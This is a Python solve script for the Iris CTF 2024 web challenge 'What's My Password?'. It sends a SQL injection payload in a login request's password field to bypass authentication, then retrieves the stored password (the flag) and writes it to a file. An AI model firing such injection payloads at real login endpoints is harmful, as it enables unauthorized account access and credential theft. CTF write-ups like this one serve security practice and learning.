# File: solve.py
# Author: Juli√°n Casaburi
# Date: January 6, 2024
# Description: This is a script to solve the challenge "What's My Password? (Iris CTF 2024 - Web Exploitation)".

import urllib.request
from urllib.error import HTTPError, URLError
import json
import os

def write_flag_to_file(flag, flag_file_path):
    with open(flag_file_path, 'w') as flag_file:
        flag_file.write(flag)
    print(f'[+] Flag written to {flag_file_path}')

url = 'https://whats-my-password-web.chal.irisc.tf/api/login'

payload = '{"username":"skat","password":"\\" OR username = \'skat\'\\""}'

try:
    # Encode payload to bytes
    data = payload.encode('utf-8')

    # Create a Request object
    request = urllib.request.Request(url, data=data)

    # Perform the request and read the response
    print(f'[+] Performing request to {url}')
    with urllib.request.urlopen(request) as response:
        response_data = response.read()

    # Decode the response bytes to string
    response_text = response_data.decode('utf-8')

    # Print the response
    print(f'[+] Response: {response_text}')

    # Print the flag
    flag = json.loads(response_text).get('password')
    print(f'[+] Flag: {flag}')

    # Write flag to file
    SOLVE_FILES_PATH = "./solve"
    # Create the solve directory if it doesn't exist
    if not os.path.exists(SOLVE_FILES_PATH):
        os.makedirs(SOLVE_FILES_PATH)

    write_flag_to_file(flag, SOLVE_FILES_PATH + "/flag.txt")

except HTTPError as e:
    print(f"[-] HTTP Error: {e.code} - {e.reason}")
except URLError as e:
    print(f"[-] URL Error: {e.reason}")
except Exception as e:
    print(f"[-] An unexpected error occurred: {str(e)}")
